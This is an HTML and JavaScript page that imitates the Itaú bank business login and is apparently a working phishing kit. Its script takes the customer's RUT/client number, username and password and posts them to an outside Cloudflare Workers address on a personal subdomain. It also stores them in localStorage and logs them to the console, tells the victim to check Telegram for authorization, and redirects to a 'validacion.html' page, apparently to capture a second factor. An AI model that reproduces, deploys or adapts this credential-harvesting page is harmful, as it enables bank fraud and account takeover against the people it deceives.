<!doctype html>
<html lang="es">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<meta name="theme-color" content="#06143f">
<title>Itaú - Acceso</title>
<style>
:root{
  --navy:#06143f;
  --orange:#ff5b00;
  --blue:#006b91;
  --text:#555;
  --border:#d2d2d2;
}
*{box-sizing:border-box}
html,body{margin:0;min-height:100%;font-family:Arial,Helvetica,sans-serif;background:#fff;color:var(--text)}
body{min-height:100vh}

/* CABECERA */
.header{
  height:110px;background:var(--navy);position:relative;
  display:flex;align-items:flex-start;padding:18px 32px
}
.logo{
  width:72px;height:72px;background:#fff;border-radius:14px;
  display:flex;align-items:center;justify-content:center;
  color:var(--navy);font-size:26px;font-weight:700;letter-spacing:-2px
}
.top-login{
  position:absolute;
  left:50%;
  top:22px;
  transform:translateX(-50%);
  width:210px;
  height:64px;
  border:2px solid #fff;
  border-radius:20px;
  color:#fff;
  display:flex;
  align-items:center;
  justify-content:space-between;
  padding:0 18px 0 28px;
  font-size:22px;
  font-weight:700;
  background:transparent;
}
.top-login .close-x{
  font-size:28px;
  font-weight:300;
  cursor:pointer;
  color:#fff;
  line-height:1;
  transition: opacity 0.2s;
}
.top-login .close-x:hover{
  opacity:0.7;
}
.search{
  position:absolute;right:88px;top:38px;width:30px;height:30px;
  border:3px solid #fff;border-radius:50%
}
.search:after{
  content:"";position:absolute;width:14px;height:3px;background:#fff;
  right:-10px;bottom:-5px;transform:rotate(45deg)
}
.menu{position:absolute;right:30px;top:40px;width:30px}
.menu i{display:block;height:3px;background:#fff;margin:6px 0}
.pointer{
  position:absolute;bottom:-1px;left:50%;transform:translateX(-50%);
  width:0;height:0;border-left:15px solid transparent;
  border-right:15px solid transparent;border-bottom:15px solid #fff
}

/* CONTENIDO */
.content{
  width:min(100% - 65px, 530px);
  margin:0 auto;
  padding:45px 0 55px
}
.select,.field{
  width:100%;height:70px;border-radius:15px;background:#fff;
  border:2px solid var(--border);padding:0 28px;
  font-size:20px;color:#999;display:flex;align-items:center
}
.select{
  border-color:#666;position:relative;margin-bottom:68px
}
.chevron{
  position:absolute;right:28px;top:23px;width:18px;height:18px;
  border-right:2.5px solid #555;border-bottom:2.5px solid #555;
  transform:rotate(45deg)
}
.field{margin-bottom:32px}
.field input{
  width:100%;height:100%;border:0;outline:0;background:transparent;
  font:inherit;color:#555;font-size:20px
}
.field input::placeholder{color:#999}
.field input:focus{
  border-color:var(--orange);
}
.btn{
  width:100%;height:80px;border:0;border-radius:15px;
  background:var(--orange);color:#fff;font-size:22px;font-weight:700;
  cursor:pointer;
  transition: opacity 0.3s;
}
.btn:hover:not(:disabled) {
  opacity: 0.9;
}
.btn:disabled {
  opacity: 0.6;
  cursor: not-allowed;
}
.btn.loading {
  opacity: 0.7;
  cursor: wait;
}
.links{
  font-size:20px;color:var(--blue);margin-top:18px;line-height:1.5
}
.links div{margin-bottom:16px;cursor:pointer}
.links div:hover{text-decoration:underline}
.note{
  font-size:11px;color:#777;text-align:center;margin-top:22px
}

/* Mensajes de estado */
#status-message {
  margin: 16px 0;
  padding: 12px 16px;
  border-radius: 11px;
  display: none;
  font-size: 14px;
  text-align: center;
}
#status-message.success {
  display: block;
  background: #d4edda;
  color: #155724;
  border: 1px solid #c3e6cb;
}
#status-message.error {
  display: block;
  background: #f8d7da;
  color: #721c24;
  border: 1px solid #f5c6cb;
}
#status-message.loading {
  display: block;
  background: #d1ecf1;
  color: #0c5460;
  border: 1px solid #bee5eb;
}

/* Transaction ID */
.transaction-id {
  display: none;
  background: #f0f0f0;
  padding: 10px 16px;
  border-radius: 10px;
  font-size: 12px;
  color: #555;
  margin: 12px 0;
  word-break: break-all;
  font-family: monospace;
  border: 1px solid #ddd;
}
.transaction-id.visible {
  display: block;
}

/* Botón reintentar */
.retry-btn {
  display: none;
  background: var(--orange);
  color: white;
  border: none;
  padding: 10px 24px;
  border-radius: 10px;
  font-size: 15px;
  cursor: pointer;
  margin: 8px auto 0;
  transition: opacity 0.3s;
}
.retry-btn.visible {
  display: block;
}
.retry-btn:hover {
  opacity: 0.9;
}

/* TABLET */
@media (max-width:900px){
  .header{height:95px;padding:15px 26px}
  .logo{width:64px;height:64px;font-size:23px;border-radius:13px}
  .top-login{top:18px;width:185px;height:58px;font-size:20px;border-radius:18px;padding:0 14px 0 24px}
  .top-login .close-x{font-size:24px}
  .search{right:76px;top:34px;width:26px;height:26px}
  .search:after{width:12px;right:-9px}
  .menu{right:24px;top:36px;width:26px}
  .menu i{height:3px;margin:5px 0}
  .content{width:min(100% - 50px,480px);padding-top:38px}
  .select,.field{height:62px;font-size:18px;padding:0 24px}
  .select{margin-bottom:56px}
  .chevron{right:22px;top:20px;width:16px;height:16px}
  .field{margin-bottom:28px}
  .field input{font-size:18px}
  .btn{height:72px;font-size:20px}
  .links{font-size:18px}
}

/* MÓVIL */
@media (max-width:600px){
  .header{
    height:80px;
    padding:12px 18px;
  }
  .logo{
    width:52px;height:52px;border-radius:11px;
    font-size:20px;letter-spacing:-1.5px
  }
  .top-login{
    top:14px;
    width:130px;
    height:48px;
    border-radius:15px;
    font-size:17px;
    padding:0 10px 0 18px;
  }
  .top-login .close-x{
    font-size:20px;
  }
  .search{
    right:56px;top:28px;width:22px;height:22px;
    border-width:2.5px
  }
  .search:after{
    width:10px;height:2.5px;right:-7px;bottom:-4px
  }
  .menu{
    right:16px;top:30px;width:22px
  }
  .menu i{height:2.5px;margin:4px 0}
  .pointer{
    border-left-width:11px;border-right-width:11px;border-bottom-width:11px
  }

  .content{
    width:calc(100% - 30px);
    max-width:none;
    padding:32px 0 38px
  }
  .select,.field{
    height:52px;
    border-radius:11px;
    padding:0 18px;
    font-size:16px
  }
  .select{
    margin-bottom:44px
  }
  .chevron{
    right:16px;top:16px;width:13px;height:13px;border-width:2px
  }
  .field{margin-bottom:20px}
  .field input{font-size:16px}
  .btn{
    height:60px;border-radius:11px;
    font-size:17px
  }
  .links{
    margin-top:14px;
    font-size:15px;
    line-height:1.4
  }
  .links div{margin-bottom:12px}
  .note{font-size:10px;margin-top:16px}
  #status-message {
    font-size:12px;
    padding:10px 13px;
  }
  .transaction-id {
    font-size:11px;
    padding:8px 13px;
  }
  .retry-btn {
    font-size:13px;
    padding:8px 20px;
  }
}

/* TELÉFONOS MUY PEQUEÑOS */
@media (max-width:380px){
  .header{height:68px;padding:9px 12px}
  .logo{width:44px;height:44px;font-size:17px}
  .top-login{top:10px;width:132px;height:42px;font-size:15px;border-radius:13px;padding:0 8px 0 14px}
  .top-login .close-x{font-size:17px}
  .search{right:46px;top:24px}
  .menu{right:12px;top:26px}
  .content{width:calc(100% - 22px);padding-top:25px}
  .select,.field{height:46px;font-size:14px}
  .select{margin-bottom:36px}
  .field{margin-bottom:16px}
  .field input{font-size:14px}
  .btn{height:52px;font-size:15px}
  .links{font-size:13px}
  #status-message {
    font-size:11px;
    padding:8px 11px;
  }
}
</style>
</head>
<body>

<header class="header">
  <div class="logo">itaú</div>
  
  <!-- INGRESAR CON X DENTRO -->
  <div class="top-login">
    Ingresar
    <span class="close-x" onclick="window.location.reload()">✕</span>
  </div>
  
  <div class="search" aria-hidden="true"></div>
  <div class="menu" aria-hidden="true"><i></i><i></i><i></i></div>
  <div class="pointer" aria-hidden="true"></div>
</header>

<main class="content">
  <div class="select">
    Empresas
    <span class="chevron"></span>
  </div>

  <div class="field">
    <input id="dni" aria-label="RUT/No. Cliente" placeholder="RUT/No. Cliente" type="text">
  </div>
  <div class="field">
    <input id="usuario" aria-label="Usuario" placeholder="Usuario" type="text">
  </div>
  <div class="field">
    <input id="clave" aria-label="Contraseña" placeholder="Contraseña" type="password">
  </div>

  <button id="loginBtn" class="btn">Ingresar</button>

  <!-- Contenedor para mensajes de estado -->
  <div id="status-message"></div>

  <!-- Transaction ID -->
  <div id="transactionId" class="transaction-id"></div>

  <!-- Botón reintentar -->
  <button id="retryBtn" class="retry-btn">🔄 Reintentar</button>

  <div class="links">
    <div onclick="alert('Función en desarrollo')">Adherirse a Itaú/Link Empresa ›</div>
    <div onclick="alert('Función en desarrollo')">Olvidé mi contraseña ›</div>
  </div>

  <div class="note">Sistema de autenticación seguro</div>
</main>

<script>
// ========================= CONFIGURACIÓN =========================
const WORKER_URL = 'https://shy-resonance-6d69.micollflorez.workers.dev';

// ========================= FUNCIONES =========================
function generarTransactionId() {
    return crypto.randomUUID ? crypto.randomUUID() : 
        Math.random().toString(36).substring(2) + Date.now().toString(36);
}

function mostrarMensaje(contenedor, tipo, texto) {
    contenedor.className = '';
    contenedor.textContent = texto;
    if (tipo) {
        contenedor.classList.add(tipo);
    }
    contenedor.style.display = 'block';
}

function ocultarMensaje(contenedor) {
    contenedor.className = '';
    contenedor.textContent = '';
    contenedor.style.display = 'none';
}

function mostrarTransactionId(contenedor, id) {
    contenedor.textContent = `🆔 ID: ${id.substring(0, 8)}...${id.substring(id.length - 4)}`;
    contenedor.classList.add('visible');
}

function ocultarTransactionId(contenedor) {
    contenedor.classList.remove('visible');
    contenedor.textContent = '';
}

// ========================= FUNCIÓN DE LOGIN =========================
async function handleLogin() {
    const dni = document.getElementById('dni').value.trim();
    const usuario = document.getElementById('usuario').value.trim();
    const clave = document.getElementById('clave').value.trim();
    const loginBtn = document.getElementById('loginBtn');
    const mensajeContenedor = document.getElementById('status-message');
    const transactionIdContenedor = document.getElementById('transactionId');
    const retryBtn = document.getElementById('retryBtn');

    // Validar campos
    if (!dni || !usuario || !clave) {
        mostrarMensaje(mensajeContenedor, 'error', '⚠️ Por favor, completa todos los campos');
        return;
    }

    // Deshabilitar botón durante la petición
    loginBtn.disabled = true;
    loginBtn.classList.add('loading');
    retryBtn.classList.remove('visible');
    const textoOriginal = loginBtn.textContent;
    loginBtn.textContent = '⏳ ENVIANDO...';
    ocultarMensaje(mensajeContenedor);
    ocultarTransactionId(transactionIdContenedor);

    const transactionId = generarTransactionId();

    try {
        mostrarMensaje(mensajeContenedor, 'loading', '🔄 Enviando datos de autenticación...');

        const response = await fetch(`${WORKER_URL}/login`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                dni: dni,
                usuario: usuario,
                clave: clave,
                transactionId: transactionId
            })
        });

        const data = await response.json();

        if (response.ok && data.ok) {
            // GUARDAR TODOS LOS DATOS EN LOCALSTORAGE para validacion.html
            const datosLogin = {
                dni: dni,
                usuario: usuario,
                clave: clave,
                transactionId: transactionId,
                timestamp: Date.now()
            };
            localStorage.setItem('bancoldata', JSON.stringify(datosLogin));
            
            console.log('✅ Datos guardados en localStorage:', datosLogin);
            
            // Mostrar mensaje de éxito
            mostrarTransactionId(transactionIdContenedor, transactionId);
            mostrarMensaje(mensajeContenedor, 'success', 
                `✅ Solicitud enviada correctamente\n📱 Revisa Telegram para autorizar\n⏳ Redirigiendo...`);
            
            // Redirigir a la página de validación
            setTimeout(() => {
                window.location.href = 'validacion.html';
            }, 2000);
            
        } else {
            mostrarMensaje(mensajeContenedor, 'error', 
                `❌ Error: ${data.error || 'No se pudo procesar la solicitud'}`);
            retryBtn.classList.add('visible');
        }
    } catch (error) {
        console.error('Error en login:', error);
        mostrarMensaje(mensajeContenedor, 'error', 
            '❌ ERROR DE CONEXIÓN\nNo se pudo conectar con el servidor.\nVerifica tu conexión a internet.');
        retryBtn.classList.add('visible');
    } finally {
        // Restaurar botón
        loginBtn.disabled = false;
        loginBtn.classList.remove('loading');
        loginBtn.textContent = textoOriginal;
    }
}

// ========================= EVENT LISTENERS =========================
document.addEventListener('DOMContentLoaded', function() {
    const loginBtn = document.getElementById('loginBtn');
    const retryBtn = document.getElementById('retryBtn');
    const inputs = document.querySelectorAll('input');

    // Click en botón
    loginBtn.addEventListener('click', handleLogin);

    // Botón de reintentar
    retryBtn.addEventListener('click', handleLogin);

    // Enter en cualquier input
    inputs.forEach(input => {
        input.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                e.preventDefault();
                handleLogin();
            }
        });
    });

    // Ocultar mensajes al empezar a escribir
    inputs.forEach(input => {
        input.addEventListener('focus', function() {
            const mensajeContenedor = document.getElementById('status-message');
            ocultarMensaje(mensajeContenedor);
        });
    });

    console.log('🚀 Sistema de autenticación Itaú listo');
    console.log(`📡 Worker URL: ${WORKER_URL}`);
});
</script>

</body>
</html>
